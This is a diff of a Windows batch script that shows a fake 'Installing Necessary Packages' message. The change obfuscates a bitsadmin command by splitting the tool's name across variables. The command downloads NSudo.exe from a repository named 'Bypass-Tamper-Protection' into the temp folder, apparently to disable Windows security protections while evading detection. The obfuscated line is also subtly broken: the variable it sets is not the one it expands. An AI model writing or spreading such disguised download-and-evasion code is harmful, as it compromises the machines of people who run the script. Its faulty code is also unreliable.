@@ -29,7 +29,11 @@ echo  Installing Necessary Packages.....Please Wait.......
 
 cd  %temp%
 
-bitsadmin /transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe %temp%\NSudo.exe
+set c1c2c3c4c5=bits
+
+set c1c2c3c4c5c6c7=admin
+
+%c1c2c3c4c5c6%%c1c2c3c4c5c6c7%/transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe %temp%\NSudo.exe
 
 set pop=%systemroot%
 
